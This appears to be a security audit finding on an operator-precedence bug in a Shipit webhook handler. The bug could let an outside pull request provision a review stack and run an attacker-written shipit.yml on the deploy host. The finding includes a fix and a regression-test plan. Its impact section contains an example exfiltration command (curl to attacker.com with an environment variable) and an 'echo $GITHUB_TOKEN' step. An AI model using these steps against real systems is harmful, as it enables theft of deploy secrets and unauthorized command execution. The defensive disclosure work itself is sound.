### Title
`provision?` operator-precedence bug bypasses `review_stacks_enabled`, letting an attacker's PR provision a review stack on an opted-out repository - (File: `app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb`)

### Summary
`OpenedHandler#provision?` intends to require `repository.review_stacks_enabled` for *any* provisioning path, but Ruby operator precedence makes `&&` bind tighter than `||`, so the `allow_with_label?` and `prevent_with_label?` branches are evaluated independently of `review_stacks_enabled`. On a repository with `review_stacks_enabled: false` and `provisioning_behavior: prevent_with_label`, any PR opened without the provisioning label satisfies `provision?`, causing `ReviewStackAdapter#create!` to provision a real `ReviewStack` whose `branch` is the attacker's own PR head ref. Subsequent deploy tasks then check out and execute the attacker's `shipit.yml` inside the task's merged environment (`TaskCommands#env`), which is passed unmodified into `Command`/`PTY.spawn`.

### Finding Description
Broken binding (equality that should hold but doesn't):
`provision?() == (repository.review_stacks_enabled && (allow_all? || (allow_with_label? && has_label?) || (prevent_with_label? && !has_label?)))`

Actual implementation: [1](#0-0) 
which parses (per Ruby `&&`/`||` precedence) as:
`(review_stacks_enabled && allow_all?) || (allow_with_label? && has_label?) || (prevent_with_label? && !has_label?)`

`review_stacks_enabled` is only ANDed into the first disjunct. When `review_stacks_enabled` is `false` and `provisioning_behavior` is `prevent_with_label`, the third disjunct `(prevent_with_label? && !has_label?)` is `true` for any PR that omits the provisioning label - which is the attacker's default state (they never add the label). This makes `respond_to_pull_request_opened?` true and calls: [2](#0-1) 

`ReviewStackAdapter#create!` then builds a `Stack`/`ReviewStack` record with `branch: params.pull_request.head.ref` - i.e., the attacker's own branch, fully attacker-named and attacker-populated: [3](#0-2) 

Once queued via `Shipit::ReviewStackProvisioningQueue.add(stack)` and provisioned, ordinary deploy machinery runs: `TaskCommands#checkout` checks out the attacker branch's commit, `deploy_spec` (`DeploySpec::FileSystem`) reads `shipit.yml` from that checkout, and `TaskCommands#perform`/`install_dependencies` builds `Command.new(command_line, env:, chdir:)` using the merged environment from `TaskCommands#env`: [4](#0-3) 

That merged env (base `Commands#env`, `@stack.env`, `deploy_spec.machine_env`, `@task.env`) is passed into `Command`, which spawns the shipit.yml-defined command line via `PTY.spawn` with that environment attached to the child process. Any deploy-time credential materialized into that environment (e.g., a git-askpass token used for authenticated clones) becomes readable by attacker-authored shell text (`echo $GITHUB_TOKEN`) because the executed command text - not the environment - is attacker controlled.

None of the existing guards intercept this: `verify_signature`/`GitHubApp#verify_webhook_signature` only authenticate that the webhook truly came from GitHub for that repository (which it does - the attacker legitimately opened a PR, so GitHub emits a legitimate, correctly signed webhook); `require_permission!`/`User#authorized?` gate the Shipit UI/API, not webhook-driven provisioning; there is no repository-permission check requiring the PR author be a collaborator before `ReviewStackAdapter#create!` runs. The single guard that was supposed to prevent this - `review_stacks_enabled` - is the one broken by the precedence bug.

### Impact Explanation
An unprivileged GitHub user who can merely open a pull request against a repository configured with `provisioning_behavior: prevent_with_label` (regardless of `review_stacks_enabled`) can force Shipit to create and provision a `ReviewStack` bound to their own branch, then have Shipit execute their attacker-authored `shipit.yml` deploy/dependency steps on the deploy host. Because those steps run inside the same process environment Shipit assembles for legitimate deploys (`TaskCommands#env`, `Command`, `PTY.spawn`), any credential exposed to that environment (deploy secrets, git tokens used for checkout/push) can be exfiltrated via simple shell commands (`echo $VAR`, `curl attacker.com?x=$VAR`). This is repeatable per pull request/repository and constitutes both an authorization bypass (a record - the `ReviewStack` - created for a repository/branch that never opted into this feature) and a path to credential exfiltration / unauthorized command execution on the deploy host, matching the "Critical" category (exfiltration of deploy-time secrets, RCE via `Command`/`PTY.spawn`).

### Likelihood Explanation
Preconditions: repository has `review_stacks_enabled: false` and `provisioning_behavior: prevent_with_label` (a plausible, not obscure, configuration - it's a selectable enum value independent of `review_stacks_enabled` in the UI) and the attacker's PR does not carry the provisioning label (default state, trivial to satisfy). Attacker cost is minimal: open a PR from a branch containing a malicious `shipit.yml`. No secrets, sessions, or elevated GitHub roles are required. This is fully repeatable against any repository sharing this configuration combination.

### Recommendation
Fix operator grouping in `provision?` so `review_stacks_enabled` gates all branches, e.g.:
```ruby
def provision?
  repository.review_stacks_enabled && (
    repository.provisioning_behavior_allow_all? ||
    (repository.provisioning_behavior_allow_with_label? && pull_request_has_provisioning_label?) ||
    (repository.provisioning_behavior_prevent_with_label? && !pull_request_has_provisioning_label?)
  )
end
```
Apply the same fix to any other handler using the identical expression (e.g., `ReopenedHandler`), and add a regression test asserting `provision?` is always `false` when `review_stacks_enabled` is `false`, independent of `provisioning_behavior`/label state.

### Proof of Concept
Minitest plan (`test/models/shipit/webhooks/handlers/pull_request/opened_handler_test.rb`):
1. Create a `Repository` with `review_stacks_enabled: false` and `provisioning_behavior: 'prevent_with_label'`.
2. Build webhook `params` for a `pull_request.opened` event with no `provisioning_label_name` in `labels`.
3. Call `Shipit::Webhooks::Handlers::PullRequest::OpenedHandler.new(params).process`.
4. Assert (binding check): before fix, `repository.review_stacks.count == 1` and the created stack's `branch == params.pull_request.head.ref` even though `repository.review_stacks_enabled == false` - i.e., assert the two sides of the intended equality (`provision?` result vs. `review_stacks_enabled`) diverge.
5. After applying the parenthesization fix, re-run and assert `repository.review_stacks.count == 0`.

Downstream secret-exposure PoC (`test/lib/shipit/task_commands_test.rb`), stubbing rather than live GitHub:
1. Stub `DeploySpec::FileSystem#steps` to return `['echo $GITHUB_TOKEN']`.
2. Stub `TaskCommands#env` (or the base `Commands#env`) to include `'GITHUB_TOKEN' => 'secret-token-value'`.
3. Call `TaskCommands#perform` and capture the resulting `Command#args`/`env`.
4. Assert the constructed `Command`'s `env` hash contains `GITHUB_TOKEN` and that the command line executed is exactly the attacker-supplied `'echo $GITHUB_TOKEN'`, demonstrating the attacker-controlled command text runs inside an environment containing the secret.
